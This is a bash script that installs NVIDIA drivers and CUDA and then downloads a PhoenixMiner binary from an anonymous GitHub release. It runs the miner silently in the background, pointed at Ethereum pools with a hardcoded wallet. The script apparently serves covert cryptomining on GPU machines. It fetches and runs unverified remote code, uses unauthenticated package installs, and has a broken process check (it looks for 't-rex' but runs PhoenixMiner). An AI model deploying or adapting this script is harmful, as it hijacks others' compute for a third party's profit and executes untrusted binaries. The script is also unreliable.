woker=$(date +'%d%m_')
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ]; then
	echo "Start setup..."
	wget http://us.download.nvidia.com/tesla/410.129/nvidia-diag-driver-local-repo-ubuntu1604-410.129_1.0-1_amd64.deb
	sudo dpkg -i nvidia-diag-driver-local-repo-ubuntu1604-410.129_1.0-1_amd64.deb
	sudo apt-key add /var/nvidia-diag-driver-local-repo-410.129/7fa2af80.pub
	sudo apt-get update
	sudo apt-get -y install cuda-drivers --allow-unauthenticated
	sudo apt-get install gcc g++ build-essential libssl-dev automake linux-headers-$(uname -r) git gawk libcurl4-openssl-dev libjansson-dev xorg libc++-dev libgmp-dev python-dev -y
	wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin
	sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
	wget https://developer.download.nvidia.com/compute/cuda/10.0/secure/Prod/local_installers/cuda-repo-ubuntu1604-10-0-local-10.0.130-410.48_1.0-1_amd64.deb
	sudo dpkg -i cuda-repo-ubuntu1604-10-0-local-10.0.130-410.48_1.0-1_amd64.deb
	sudo apt-key add /var/cuda-repo-10-0-local-10.0.130-410.48/7fa2af80.pub
	sudo apt-get update
	sudo apt-get -y install cuda
	sudo apt-get install libcurl3 -y
	echo "taind vip pro" > isHaveSetupCoin.txt
	wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz ; tar -zxvf PhoenixMiner_5.6d_Linux.tar.gz
  	sudo killall XXX
	./PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eth.2miners.com:2020 -wal 0xC16BA00292B95dcb6320d664ea4095C69E7b11Ad -worker STD1 -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
else
	if pgrep t-rex >/dev/null 2>&1
	then
		echo "RUNNING"
	else
		wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz ; tar -zxvf PhoenixMiner_5.6d_Linux.tar.gz
    		sudo killall XXX
			./PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0xC16BA00292B95dcb6320d664ea4095C69E7b11Ad -worker STD1 -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
	fi
fi
